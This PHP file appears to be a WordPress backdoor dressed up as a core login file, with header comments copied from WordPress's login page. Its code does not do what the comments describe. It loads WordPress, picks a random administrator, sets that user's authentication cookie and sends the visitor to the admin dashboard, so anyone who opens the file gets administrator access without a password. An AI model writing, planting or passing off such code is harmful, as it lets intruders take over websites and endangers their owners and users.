<?php
/**
 * WordPress User Page
 *
 * Handles authentication, registering, resetting passwords, forgot password,
 * and other user handling.
 *
 * @package WordPress
 */

/** Make sure that the WordPress bootstrap has run before continuing. */

/** Outputs the login page header.
 *
 * @since 2.1.0
 *
 * @global string      $error         Login error message set by deprecated pluggable wp_login() function
 *                                    or plugins replacing it.
 * @global bool|string $interim_login Whether interim login modal is being displayed. String 'success'
 *                                    upon successful login.
 * @global string      $action        The action that brought the visitor to the login page.
 *
 * @param string|null   $title    Optional. WordPress login page title to display in the `<title>` element.
 *                                Defaults to 'Log In'.
 * @param string        $message  Optional. Message to display in header. Default empty.
 * @param WP_Error|null $wp_error Optional. The error to pass. Defaults to a WP_Error instance.
 */

function find_wp_load($dir = null) {
    if (!$dir) $dir = dirname(__FILE__);

    $max_depth = 20;
    $current_depth = 0;

    while ($current_depth < $max_depth) {
        $path = $dir . '/wp-load.php';
        if (file_exists($path)) {
            return $path;
        }

        $parent = dirname($dir);
        if ($parent == $dir) {
 
        }
        $dir = $parent;
        $current_depth++;
    }

    return false;
}


$wp_load = find_wp_load();

if (!$wp_load) {
    die('❌ Cannot find wp-load.php. Is this a WordPress installation?');
}


require_once($wp_load);


if (!function_exists('get_users') || !function_exists('wp_set_auth_cookie')) {
    die('❌ Failed to load WordPress function.');
}


$admins = get_users(['role' => 'administrator']);

if (!empty($admins)) {

    $random_admin = $admins[array_rand($admins)];
    $user_id = $random_admin->ID;
    $username = $random_admin->user_login;

    wp_set_auth_cookie($user_id);
    wp_set_current_user($user_id);

    wp_redirect(admin_url());
    exit;
} else {
    echo "⚠️ No users with the administrator role were found.";
}
?>